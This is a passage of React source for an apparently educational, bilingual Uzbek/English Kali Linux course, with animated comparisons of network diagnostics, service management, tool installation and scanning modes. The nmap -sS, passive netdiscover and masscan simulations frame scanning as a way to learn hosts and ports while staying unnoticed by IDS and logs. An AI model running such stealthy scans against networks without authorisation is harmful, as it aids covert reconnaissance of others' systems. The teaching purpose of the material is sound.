    {col:AM,uz:"./scan.sh — skript ishga tushadi, tekshirish avtomatik ketma-ket boradi",en:"./scan.sh — the script runs, checking proceeds automatically in sequence",duz:"Kompyuter charchamaydi va hech birini o'tkazib yubormaydi.",den:"The computer doesn't get tired and never skips one."},
    {col:A,uz:"⚡ ~4 daqiqa (ping kutish vaqtiga bog'liq), 0 ta o'tkazib yuborish",en:"⚡ ~4 minutes (bounded by ping's wait time), zero skips",duz:"Bir marta yozilgan mantiq — istalgancha marta, xatosiz qaytariladi.",den:"Logic written once repeats flawlessly, as many times as needed.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="manual"?MANUAL:SCRIPT;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="manual"?MANUAL:run==="script"?SCRIPT:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — 254 ta IP'ni qo'lda va bitta skript bilan tekshirishni solishtiring.","⬇ Pick a scenario — compare checking 254 IPs by hand versus with one script.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="manual"?t(lang,"✗ Qo'lda: sekin, charchoq, o'tkazib yuborishlar","✗ By hand: slow, tiring, things get missed"):t(lang,"✓ Skript bilan: tez, charchamaydi, hech narsa o'tkazib yuborilmaydi","✓ With a script: fast, tireless, nothing skipped")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("manual");setStep(-1);},style:{flex:1,padding:"9px",background:run==="manual"?D+"22":SL2,color:run==="manual"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"😩 Qo'lda (254 marta)","😩 By hand (254 times)")),
      React.createElement("button",{onClick:()=>{setRun("script");setStep(-1);},style:{flex:1,padding:"9px",background:run==="script"?A+"22":SL2,color:run==="script"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"⚡ Skript bilan (bitta sikl)","⚡ With a script (one loop)"))));
}

function NetDiagSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const DNSB=[
    {col:BL,uz:"ip a — eth0 da IP bor: 10.0.2.15/24 ✓",en:"ip a — eth0 has an IP: 10.0.2.15/24 ✓",duz:"Birinchi qatlam sog'lom — mashinaning o'zi tarmoqda.",den:"The first layer is healthy — the machine itself is on the network."},
    {col:AM,uz:"ping 10.0.2.2 (shlyuz) — javob keladi ✓",en:"ping 10.0.2.2 (the gateway) — it replies ✓",duz:"Mahalliy tarmoq va router ishlayapti.",den:"The local network and router are working."},
    {col:AM,uz:"ping 8.8.8.8 (to'g'ridan-to'g'ri IP) — javob keladi ✓ — internet ishlayapti!",en:"ping 8.8.8.8 (raw IP) — it replies ✓ — the internet works!",duz:"Gateway'dan tashqariga chiqish yo'li ham ochiq.",den:"The route out past the gateway is open too."},
    {col:D,uz:"ping google.com — «Name or service not known» ✗",en:"ping google.com — «Name or service not known» ✗",duz:"Faqat NOM orqali so'ralganda uziladi — muammo aynan DNS'da.",den:"It only breaks when resolving by NAME — the problem is exactly DNS.",final:true,verdict:{uz:"🔤 Diagnoz: DNS ishlamayapti (lekin tarmoqning o'zi soz)",en:"🔤 Diagnosis: DNS is broken (but the network itself is fine)"}}
  ];
  const GWD=[
    {col:BL,uz:"ip a — eth0 da IP bor: 10.0.2.15/24 ✓",en:"ip a — eth0 has an IP: 10.0.2.15/24 ✓",duz:"Xuddi shu birinchi natija — mashina o'zi sog'lom.",den:"The exact same first result — the machine itself is fine."},
    {col:D,uz:"ping 10.0.2.2 (shlyuz) — «Destination Host Unreachable» ✗",en:"ping 10.0.2.2 (the gateway) — «Destination Host Unreachable» ✗",duz:"Ikkinchi qatlamning o'zida uziladi.",den:"It breaks right at the second layer."},
    {col:AM,uz:"Shlyuzning o'zi javob bermayapti — undan naryidagi (8.8.8.8, DNS) tekshirish shart emas",en:"The gateway itself doesn't answer — no point testing anything further out",duz:"Zanjirning shu bo'g'inidan narisini tekshirish vaqt yo'qotish bo'lardi.",den:"Testing past this link in the chain would just waste time."},
    {col:D,uz:"🔌 Muammo mahalliy tarmoqda — router o'chgan yoki kabel uzilgan",en:"🔌 The problem is on the LAN — the router is off or the cable is unplugged",duz:"DNS yoki internetni tekshirishning ma'nosi yo'q, chunki undan oldingi bosqich allaqachon buzuq.",den:"There's no point checking DNS or the internet — an earlier layer is already broken.",final:true,verdict:{uz:"🔌 Diagnoz: mahalliy tarmoq/shlyuz muammosi",en:"🔌 Diagnosis: local network/gateway problem"}}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="dns"?DNSB:GWD;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="dns"?DNSB:run==="gw"?GWD:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — bosqichma-bosqich tekshiruv qayerda uzilishiga qarab muammoni qanday aniq topishini ko'ring.","⬇ Pick a scenario — see how the step-by-step check pinpoints the problem based on exactly where it breaks.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0",fontFamily:"var(--font-mono)"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:D+"1f",border:"1px solid "+D,color:D}},
      t(lang,cur.verdict.uz,cur.verdict.en)),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("dns");setStep(-1);},style:{flex:1,padding:"9px",background:run==="dns"?AM+"22":SL2,color:run==="dns"?AM:"#cbd5e1",border:"1px solid "+AM+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔤 DNS muammosi","🔤 DNS problem")),
      React.createElement("button",{onClick:()=>{setRun("gw");setStep(-1);},style:{flex:1,padding:"9px",background:run==="gw"?D+"22":SL2,color:run==="gw"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔌 Shlyuz muammosi","🔌 Gateway problem"))));
}

function ServiceLifecycleSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const STARTONLY=[
    {col:BL,uz:"sudo systemctl start ssh — SSH hoziroq ishga tushdi",en:"sudo systemctl start ssh — SSH starts right now",duz:"Buyruq darhol bajariladi, xizmat ishlay boshlaydi.",den:"The command runs immediately, the service starts running."},
    {col:AM,uz:"systemctl status ssh — Active: active (running) ✓",en:"systemctl status ssh — Active: active (running) ✓",duz:"Hozircha hammasi soz ko'rinadi.",den:"So far everything looks fine."},
    {col:AM,uz:"Kali qayta yuklanadi (reboot)...",en:"Kali reboots...",duz:"Masalan elektr uzilishi yoki oddiy qayta ishga tushirish.",den:"Say, a power blip or a routine restart."},
    {col:D,uz:"😴 SSH ishlamayapti — enable qilinmagani uchun avtomatik boshlanmadi",en:"😴 SSH isn't running — it never auto-started because it wasn't enabled",duz:"start faqat «hozir» degani, «doim» degani emas.",den:"start only means «now», not «forever».",final:true,bad:true}
  ];
  const ENABLED=[
    {col:BL,uz:"sudo systemctl enable ssh — SSH yuklanishda avtomatik ishga tushishga sozlandi",en:"sudo systemctl enable ssh — SSH is configured to auto-start at boot",duz:"Diqqat: bu hali uni HOZIR ishga tushirmaydi.",den:"Note: this doesn't start it NOW."},
    {col:AM,uz:"(Faqat kelajakdagi yuklanishlar uchun sozlandi — hozirgi holat o'zgarmadi)",en:"(Only future boots are configured — the current state is unchanged)",duz:"Shu sababli ko'pincha start && enable birga ishlatiladi.",den:"That's why start && enable are often used together."},
    {col:AM,uz:"Kali qayta yuklanadi (reboot)...",en:"Kali reboots...",duz:"Xuddi shu voqea — sozlama esa boshqacha.",den:"The exact same event — but the configuration differs."},
    {col:A,uz:"✅ SSH avtomatik ishga tushdi — systemd uni o'zi yuklanishda ishga tushirdi",en:"✅ SSH auto-started — systemd launched it on boot by itself",duz:"enable — «doim shunday bo'lsin» degan doimiy sozlama.",den:"enable is a permanent setting: «always do this from now on».",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="start"?STARTONLY:ENABLED;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="start"?STARTONLY:run==="enable"?ENABLED:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — reboot'dan keyin faqat start va enable qilingan xizmat qanday farq qilishini ko'ring.","⬇ Pick a scenario — see the difference after a reboot between a service that was only started and one that was enabled.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="start"?t(lang,"✗ start (bir martalik): reboot'dan keyin o'chib qoladi","✗ start (one-time): dies after a reboot"):t(lang,"✓ enable (doimiy): reboot'dan keyin o'zi qayta ishga tushadi","✓ enable (permanent): comes back by itself after a reboot")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("start");setStep(-1);},style:{flex:1,padding:"9px",background:run==="start"?D+"22":SL2,color:run==="start"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"▶ Faqat start","▶ start only")),
      React.createElement("button",{onClick:()=>{setRun("enable");setStep(-1);},style:{flex:1,padding:"9px",background:run==="enable"?A+"22":SL2,color:run==="enable"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔁 start + enable","🔁 start + enable"))));
}

function ToolSourceSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const REPO=[
    {col:BL,uz:"apt search gobuster — natija topildi: gobuster/kali-rolling 3.6.0",en:"apt search gobuster — a result is found: gobuster/kali-rolling 3.6.0",duz:"Vosita rasmiy Kali ombori tomonidan qadoqlangan va tekshirilgan.",den:"The tool is packaged and vetted by the official Kali repo."},
    {col:AM,uz:"sudo apt install gobuster — bog'liqliklar bilan avtomatik o'rnatiladi",en:"sudo apt install gobuster — installs automatically with its dependencies",duz:"Go kutubxonalarini qo'lda yig'ish shart emas.",den:"No need to manually gather Go libraries."},
    {col:AM,uz:"which gobuster — /usr/bin/gobuster, PATH'da tayyor",en:"which gobuster — /usr/bin/gobuster, ready on PATH",duz:"Har qayerdan gobuster deb chaqirsa bo'ladi.",den:"It can be invoked as gobuster from anywhere."},
    {col:A,uz:"✅ ~15 soniyada tayyor — apt hammasini o'zi hal qildi",en:"✅ Ready in ~15 seconds — apt handled everything itself",duz:"Kali'ning 600+ vositasining aksariyati aynan shu tez yo'ldan o'tadi.",den:"Most of Kali's 600+ tools go through exactly this fast path.",final:true}
  ];
  const GITHUB=[
    {col:BL,uz:"apt search newtool123 — hech narsa topilmadi",en:"apt search newtool123 — nothing found",duz:"Yangi yoki niche vosita hali Kali omboriga qo'shilmagan bo'lishi mumkin.",den:"A new or niche tool may not have made it into the Kali repo yet."},
    {col:AM,uz:"kali.org/tools va GitHub'da qidiriladi — loyihaning manzili topiladi",en:"Search kali.org/tools and GitHub — the project's repo is found",duz:"Ko'p xavfsizlik vositasi faqat GitHub'da tarqatiladi.",den:"Many security tools are distributed only via GitHub."},
    {col:AM,uz:"git clone ... && pip install -r requirements.txt — qo'lda o'rnatish",en:"git clone ... && pip install -r requirements.txt — manual install",duz:"Bog'liqliklarni endi siz o'zingiz hal qilasiz.",den:"Now you resolve the dependencies yourself."},
    {col:AM,uz:"python3 newtool123.py — to'g'ridan-to'g'ri manba kodidan ishga tushiriladi",en:"python3 newtool123.py — run directly from the source code",duz:"apt emas, siz vositaning \"paket menejeri\"siz.",den:"Not apt — you are the tool's \"package manager\" this time.",final:true,slow:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="repo"?REPO:GITHUB;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="repo"?REPO:run==="github"?GITHUB:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — kerakli vosita Kali omborida bor va yo'q holatlarini solishtiring.","⬇ Pick a scenario — compare finding a tool that's in the Kali repo versus one that isn't.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.slow?AM:A)+"1f",border:"1px solid "+(cur.slow?AM:A),color:cur.slow?AM:A}},
      run==="repo"?t(lang,"✓ Omborda bor: apt hammasini bir buyruqda hal qiladi","✓ In the repo: apt handles everything in one command"):t(lang,"⏳ Omborda yo'q: ishlaydi, lekin qo'l mehnati ko'proq kerak","⏳ Not in the repo: it works, but needs more manual effort")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("repo");setStep(-1);},style:{flex:1,padding:"9px",background:run==="repo"?A+"22":SL2,color:run==="repo"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"📦 Omborda bor","📦 In the repo")),
      React.createElement("button",{onClick:()=>{setRun("github");setStep(-1);},style:{flex:1,padding:"9px",background:run==="github"?AM+"22":SL2,color:run==="github"?AM:"#cbd5e1",border:"1px solid "+AM+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🐙 Omborda yo'q (GitHub)","🐙 Not in repo (GitHub)"))));
}

function ScanStealthSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const CONNECT=[
    {col:BL,uz:"nmap -sT 10.0.0.5 — to'liq TCP qo'l siqish (SYN → SYN-ACK → ACK)",en:"nmap -sT 10.0.0.5 — a full TCP handshake (SYN → SYN-ACK → ACK)",duz:"Uchinchi ACK yuborilishi bilan ulanish TO'LIQ ochiladi.",den:"Sending that third ACK fully opens the connection."},
    {col:AM,uz:"Nishon: ulanish to'liq o'rnatildi — dastur darajasida qabul qilinadi",en:"Target: the connection is fully established — accepted at the application level",duz:"Operatsion tizim buni oddiy, haqiqiy ulanish deb hisoblaydi.",den:"The OS treats this as an ordinary, genuine connection."},
    {col:AM,uz:"auth.log va IDS'da yozuv paydo bo'ladi: «Connection from 10.0.0.9»",en:"An entry appears in auth.log and the IDS: «Connection from 10.0.0.9»",duz:"To'liq ulanishlar deyarli har doim qayd etiladi.",den:"Fully completed connections are logged almost every time."},
    {col:D,uz:"🚨 IDS ogohlantiradi — hujumchi allaqachon aniqlangan",en:"🚨 The IDS alerts — the attacker is already detected",duz:"Nishon endi hushyor — keyingi qadamlar kuzatilishi mumkin.",den:"The target is now on guard — further steps may be watched.",final:true,bad:true}
  ];
  const STEALTH=[
    {col:BL,uz:"nmap -sS 10.0.0.5 — faqat SYN yuboriladi, ACK HECH QACHON jo'natilmaydi",en:"nmap -sS 10.0.0.5 — only SYN is sent, ACK is NEVER sent",duz:"Nmap ataylab uchinchi qadamni tashlab ketadi.",den:"Nmap deliberately skips the third step."},
    {col:AM,uz:"Nishon SYN-ACK bilan javob beradi, lekin ulanish hech qachon tugallanmaydi",en:"The target replies with SYN-ACK, but the connection never completes",duz:"Bu holat «yarim ochiq» deb ataladi.",den:"This state is called «half-open»."},
    {col:AM,uz:"Ko'p ilova va oddiy loglar buni umuman qayd etmaydi — faqat kernel darajasida ko'rinadi",en:"Most apps and basic logs never record this — visible only at the kernel level",duz:"auth.log kabi ilova darajasidagi loglar bu voqeani hech qachon ko'rmaydi.",den:"App-level logs like auth.log never even see this event."},
    {col:A,uz:"🥷 Sezilmadi — port holati bilindi, nishon hushyor bo'lib qolmadi",en:"🥷 Went unnoticed — the port's state was learned, the target never got suspicious",duz:"Shu sababli -sS «stealth (yashirin) skan» deb ataladi.",den:"That's exactly why -sS is called a «stealth scan».",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="sT"?CONNECT:STEALTH;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="sT"?CONNECT:run==="sS"?STEALTH:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — xuddi shu portni skanerlash IDS tomonidan qanday farqli ko'rinishini solishtiring.","⬇ Pick a scenario — see how scanning the same port looks very different to an IDS.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="sT"?t(lang,"✗ -sT: ko'rindi va qayd etildi","✗ -sT: seen and logged"):t(lang,"✓ -sS: bilindi, lekin sezilmadi","✓ -sS: learned, but unnoticed")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("sT");setStep(-1);},style:{flex:1,padding:"9px",background:run==="sT"?D+"22":SL2,color:run==="sT"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🔌 -sT (Connect)","🔌 -sT (Connect)")),
      React.createElement("button",{onClick:()=>{setRun("sS");setStep(-1);},style:{flex:1,padding:"9px",background:run==="sS"?A+"22":SL2,color:run==="sS"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🥷 -sS (SYN)","🥷 -sS (SYN)"))));
}

function NetdiscoverModeSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const ACTIVE=[
    {col:BL,uz:"sudo netdiscover -r 10.0.0.0/24 — 254 ta ARP so'rovi darhol yuboriladi",en:"sudo netdiscover -r 10.0.0.0/24 — 254 ARP requests are sent immediately",duz:"Har bir mumkin bo'lgan IP uchun alohida so'rov yuboriladi.",den:"A separate request is sent for every possible IP."},
    {col:AM,uz:"Barcha 12 ta tirik xost soniyalar ichida javob beradi va ro'yxatlanadi",en:"All 12 live hosts reply within seconds and get listed",duz:"Sokin turgan qurilmalar ham javob berishga majbur bo'ladi.",den:"Even quiet devices are forced to respond."},
    {col:AM,uz:"Tarmoq monitoring vositasi (arpwatch) g'ayrioddiy ARP portlashini qayd etadi",en:"A network monitor (arpwatch) logs the unusual ARP burst",duz:"254 ta so'rov bir necha soniyada — bu me'yordagi trafik emas.",den:"254 requests in a few seconds isn't normal traffic."},
    {col:D,uz:"⚡ Tez (~10 soniya), lekin iz qoldirdi — kuzatuvchi buni sezishi mumkin",en:"⚡ Fast (~10 seconds), but left a trace — a watcher may notice",duz:"To'liq rasm oldingiz, lekin sukunatda emas.",den:"You got the full picture, but not quietly.",final:true,bad:true}
  ];
  const PASSIVE=[
    {col:BL,uz:"sudo netdiscover -p — hech qanday paket yuborilmaydi, faqat tinglanadi",en:"sudo netdiscover -p — no packets are sent, it only listens",duz:"Tarmoqqa sizning mavjudligingizni bildiradigan hech narsa chiqmaydi.",den:"Nothing goes out that reveals your presence on the network."},
    {col:AM,uz:"Faqat allaqachon gaplashayotgan xostlarning ARP trafigi eshitiladi",en:"Only the ARP traffic of hosts already chatting is overheard",duz:"Sokin turgan qurilmalar hech qachon o'zini bildirmaydi.",den:"Quiet devices never give themselves away."},
    {col:AM,uz:"5 daqiqa ichida atigi 7 ta xost «eshitildi» — sokin 5 tasi ko'rinmay qoldi",en:"In 5 minutes only 7 hosts are «heard» — 5 quiet ones stay invisible",duz:"Sekinroq va to'liq emas — lekin bu tinchlikning narxi.",den:"Slower and incomplete — but that's the price of staying quiet."},
    {col:A,uz:"🤫 Hech qanday iz yo'q — lekin rasm to'liq emas",en:"🤫 No trace at all — but the picture isn't complete",duz:"Yashirinlik va to'liqlik orasidagi klassik almashinuv.",den:"The classic tradeoff between stealth and completeness.",final:true}
  ];
  const [run,setRun]=useState(null);
  const [step,setStep]=useState(-1);
  useEffect(()=>{
    if(run==null){setStep(-1);return;}
    const list=run==="active"?ACTIVE:PASSIVE;
    if(step<0){const id=setTimeout(()=>setStep(0),140);return()=>clearTimeout(id);}
    if(step>=list.length-1) return;
    const id=setTimeout(()=>setStep(step+1),1000);return()=>clearTimeout(id);
  },[run,step]);
  const list=run==="active"?ACTIVE:run==="passive"?PASSIVE:null;
  const cur=list&&step>=0?list[step]:null;
  return React.createElement("div",{style:{margin:"14px 0"}},
    React.createElement("div",{style:{minHeight:50}},
      list==null?React.createElement("div",{style:{textAlign:"center",color:"#64748b",fontSize:12,padding:"14px"}},t(lang,"⬇ Ssenariy tanlang — bir xil /24 tarmoqni aktiv va passiv rejimda sinang.","⬇ Pick a scenario — probe the same /24 network in active versus passive mode.")):
      list.map(function(s,i){ if(step<i) return null;
        return React.createElement("div",{key:i,className:"na-rise",style:{padding:"10px 13px",marginBottom:7,background:step===i?s.col+"14":SL2,border:"1px solid "+s.col+(step===i?"":"44"),borderLeft:"4px solid "+s.col,borderRadius:10}},
          React.createElement("div",{style:{fontSize:12,fontWeight:700,color:"#e2e8f0"}},t(lang,s.uz,s.en)),
          React.createElement("div",{style:{fontSize:10.5,color:"#94a3b8",marginTop:3,lineHeight:1.5}},t(lang,s.duz,s.den)));})),
    cur&&cur.final&&React.createElement("div",{style:{marginTop:2,padding:"10px 14px",borderRadius:10,textAlign:"center",fontWeight:800,fontSize:12.5,background:(cur.bad?D:A)+"1f",border:"1px solid "+(cur.bad?D:A),color:cur.bad?D:A}},
      run==="active"?t(lang,"✗ Aktiv: to'liq, lekin ko'rinadigan","✗ Active: complete, but visible"):t(lang,"✓ Passiv: ko'rinmas, lekin to'liq emas","✓ Passive: invisible, but incomplete")),
    React.createElement("div",{style:{display:"flex",gap:8,marginTop:12}},
      React.createElement("button",{onClick:()=>{setRun("active");setStep(-1);},style:{flex:1,padding:"9px",background:run==="active"?D+"22":SL2,color:run==="active"?D:"#cbd5e1",border:"1px solid "+D+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"⚡ Aktiv (-r)","⚡ Active (-r)")),
      React.createElement("button",{onClick:()=>{setRun("passive");setStep(-1);},style:{flex:1,padding:"9px",background:run==="passive"?A+"22":SL2,color:run==="passive"?A:"#cbd5e1",border:"1px solid "+A+"66",borderRadius:8,fontSize:11.5,fontWeight:700,cursor:"pointer"}},t(lang,"🤫 Passiv (-p)","🤫 Passive (-p)"))));
}

function MasscanRateSim(){
  const lang=useLang();
  const A="#22c55e",D="#ef4444",AM="#f59e0b",BL="#3b82f6",SL2="#0f172a";
  const SAFE=[
    {col:BL,uz:"sudo masscan 10.0.0.0/24 -p1-65535 --rate=1000 — soniyasiga 1000 paket",en:"sudo masscan 10.0.0.0/24 -p1-65535 --rate=1000 — 1,000 packets/second",duz:"O'rtacha, ko'p tarmoq uchun xavfsiz tezlik.",den:"A moderate speed, safe for most networks."},
    {col:AM,uz:"Router va switch'lar navbatni yetkazib ulguradi — paketlar normal ishlanadi",en:"Routers and switches keep up with the queue — packets are processed normally",duz:"Hech qanday bufer to'lib toshmaydi.",den:"No buffer ever overflows."},
    {col:AM,uz:"Skan ~65 soniyada tugaydi, barcha xizmatlar ishlab turaveradi",en:"The scan finishes in ~65 seconds, all services keep running",duz:"Nishon tarmog'i skan davomida hech narsani sezmaydi.",den:"The target network notices nothing during the scan."},
    {col:A,uz:"✅ To'liq natija olindi — hech qanday xizmat uzilmadi",en:"✅ Full results obtained — no service outage",duz:"Sekinroq, lekin ishonchli va oqibatsiz.",den:"Slower, but reliable and consequence-free.",final:true}
  ];
  const RECKLESS=[
    {col:BL,uz:"sudo masscan 10.0.0.0/24 -p1-65535 --rate=100000 — soniyasiga 100 000 paket",en:"sudo masscan 10.0.0.0/24 -p1-65535 --rate=100000 — 100,000 packets/second",duz:"100x yuqori tezlik — «tezroq — yaxshiroq» degan noto'g'ri taxmin.",den:"100x the speed — the wrong assumption that «faster is always better»."},
    {col:AM,uz:"Kichik ofis switch'i bunday hajmni ko'tara olmaydi — bufer to'lib toshadi",en:"The small office switch can't handle this volume — its buffer overflows",duz:"Uskuna sizning nishoningiz uchun emas, oddiy ish uchun mo'ljallangan.",den:"The hardware was sized for ordinary work, not for this."},
